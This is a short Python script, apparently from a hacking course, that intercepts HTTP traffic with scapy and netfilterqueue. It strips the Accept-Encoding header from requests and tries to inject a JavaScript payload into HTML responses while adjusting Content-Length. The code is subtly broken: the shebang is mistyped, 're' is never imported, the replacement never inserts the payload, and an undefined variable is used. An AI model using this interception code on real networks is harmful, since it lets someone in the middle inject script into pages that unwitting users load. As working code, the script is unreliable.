#1/usr/bin/python

import scapy.all as scapy
import netfilterqueue

def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    # print(scapy_packet.show())
    if scapy_packet.haslayer(scapy.Raw):
        if scapy_packet[scapy.TCP].dport == 80:
            print("[+] Request")
            modified_load = re.sub("Accept-Encoding:.*?\\r\\n", "", scapy_packet[scapy.Raw].load)
            new_packet = set_load(scapy_packet, modified_load)
            packet.set_payload(str(new_packet))
        elif scapy_packet[scapy.TCP].sport == 80:
            print("[+] Response")
            injection_code = "<script>alert('test');</script>"
            modified_load = scapy_packet[scapy.Raw].load.replace("</body>", "</body>")
            # append code to the end of the source code
            # this time, "</body>" appears once

            content_length_search = re.search("(?:Content-Length:\s)(\d*)", load)
            # check pythex (regex for re)
            # \d* for the whole number
            if content_length_search and "text/html" in scapy_packet[scapy.Raw].load:
                # second part needed to only modify html codes due to </body> part
                content_length = content_length_search.group(1)
                new_content_length = int(content_length) + len(injection_code)
                modified_load = scapy_packet[scapy.Raw].load.replace(content_length, str(new_content_length))

            new_packet = set_load(scapy_packet, modified_load)
            packet.set_payload(str(new_packet))

    packet.accept()


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet) # 0: queue-num
queue.run()
